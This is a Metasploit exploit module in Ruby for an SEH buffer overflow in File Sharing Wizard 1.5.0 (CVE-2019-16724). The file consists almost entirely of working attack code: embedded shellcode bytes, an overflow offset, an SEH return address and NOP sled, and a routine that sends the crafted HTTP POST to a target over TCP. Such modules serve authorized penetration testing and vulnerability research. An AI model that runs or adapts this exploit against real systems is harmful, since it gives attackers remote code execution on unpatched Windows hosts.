##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    Rank = NormalRanking
    super update_info(info,
                      'Name' => 'File Sharing Wizard 1.5.0 - POST SEH Overflow',
                      'Description' => %q(
        This module exploits a SEH based buffer overflow in an HTTP POST parameter in File Sharing Wizard 1.5.0
      ),
                      'Author' => [
                          'x00pwn', # Original exploit
                          'Dean Welch <dean_welch[at]rapid7.com>' # Module
                      ],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                          [
                              ['CVE', '2019-16724'],
                              ['EDB', '47412']
                          ],
                      'Payload' =>
                          {
                              'BadChars' => "\x00",
                              'DisableNops' => true
                              # 'NopSledSize' => 100,
                              # 'Space' => 1040
                          },
                      'DisclosureDate' => 'Sep 24 2019',
                      'DefaultOptions'  =>
                          {
                              'EXITFUNC' => 'seh',
                              'RPORT' => "80",
                              'RHOSTS' => "10.5.3.71",
                              'CMD' => "calc.exe"
                          },
                      'Platform'       => 'win',
                      'Targets'        =>
                          [
                              ['v1.0 - XP / Win7',
                               {
                                   # 'Offset' => 1040,
                                   # 'Ret'    => 0x7c38a67f
                               }
                              ]
                          ],
                      )
  end

  # def check()
  #   res = send_request_cgi({ 'uri' => '10.5.3.71:80'})
  #   print_status(res.message)
  # end
  #

  def exploit()

    shellcode =  ""
    shellcode += "\xd9\xc7\xd9\x74\x24\xf4\xba\x65\x1d\x84\xe1\x5f"
    shellcode += "\x29\xc9\xb1\x31\x31\x57\x18\x03\x57\x18\x83\xef"
    shellcode += "\x99\xff\x71\x1d\x89\x82\x7a\xde\x49\xe3\xf3\x3b"
    shellcode += "\x78\x23\x67\x4f\x2a\x93\xe3\x1d\xc6\x58\xa1\xb5"
    shellcode += "\x5d\x2c\x6e\xb9\xd6\x9b\x48\xf4\xe7\xb0\xa9\x97"
    shellcode += "\x6b\xcb\xfd\x77\x52\x04\xf0\x76\x93\x79\xf9\x2b"
    shellcode += "\x4c\xf5\xac\xdb\xf9\x43\x6d\x57\xb1\x42\xf5\x84"
    shellcode += "\x01\x64\xd4\x1a\x1a\x3f\xf6\x9d\xcf\x4b\xbf\x85"
    shellcode += "\x0c\x71\x09\x3d\xe6\x0d\x88\x97\x37\xed\x27\xd6"
    shellcode += "\xf8\x1c\x39\x1e\x3e\xff\x4c\x56\x3d\x82\x56\xad"
    shellcode += "\x3c\x58\xd2\x36\xe6\x2b\x44\x93\x17\xff\x13\x50"
    shellcode += "\x1b\xb4\x50\x3e\x3f\x4b\xb4\x34\x3b\xc0\x3b\x9b"
    shellcode += "\xca\x92\x1f\x3f\x97\x41\x01\x66\x7d\x27\x3e\x78"
    shellcode += "\xde\x98\x9a\xf2\xf2\xcd\x96\x58\x98\x10\x24\xe7"
    shellcode += "\xee\x13\x36\xe8\x5e\x7c\x07\x63\x31\xfb\x98\xa6"
    shellcode += "\x76\xfd\x69\x7b\x62\x6a\xd0\xee\xcf\xf6\xe3\xc4"
    shellcode += "\x13\x0f\x60\xed\xeb\xf4\x78\x84\xee\xb1\x3e\x74"
    shellcode += "\x82\xaa\xaa\x7a\x31\xca\xfe\x18\xd4\x58\x62\xf1"
    shellcode += "\x73\xd9\x01\x0d"



    buf = "A"*1040
    # buf << generate_seh_payload(pack(0x7c38a67f))
    buf += [0x909032EB].pack('I')
    buf += [0x7c38a67f].pack("I")
    buf += "\x90" * 100
    buf += shellcode
    buf += "D"*(5000-buf.length)

    print_status("PAYLOAD: " + buf)
    payload_header = "POST " + buf
    payload_header += " HTTP/1.0\r\n\r\n"
    connect
    sock.put(payload_header)

  end

end
